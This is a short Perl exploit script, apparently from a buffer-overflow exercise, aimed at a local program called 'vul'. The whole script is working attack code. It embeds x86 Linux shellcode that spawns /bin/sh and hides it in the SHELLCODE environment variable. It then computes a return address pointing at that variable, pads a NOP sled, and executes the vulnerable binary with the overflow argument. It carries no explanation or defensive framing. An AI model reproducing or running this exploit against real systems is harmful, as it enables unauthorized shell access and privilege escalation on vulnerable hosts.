#!/usr/bin/perl
#
# exploit.pl
# exploit program vulnerable

$shellcode ="\x31\xd2\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69".
"\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80";

$path="vul";

$ret = 0xbffffffc - (length($path)+1) - (length($shellcode)+1);

$new_retword = pack('l', $ret);

printf("[+] Using ret shellcode 0x%x\n",$ret);

$nops="\x90\x90\x90\x90\x90\x90\x90\x90";  # 8 NOPs
$nops=$nops.$nops.$nops;    # 24 NOPs
$nops=$nops."\x90\x90\x90\x90"; # 28 NOPs
$argv=$nops.$new_retword;   # 28 NOPs+RETURN

%ENV=(); $ENV{SHELLCODE}=$shellcode;

exec "$path",$argv;

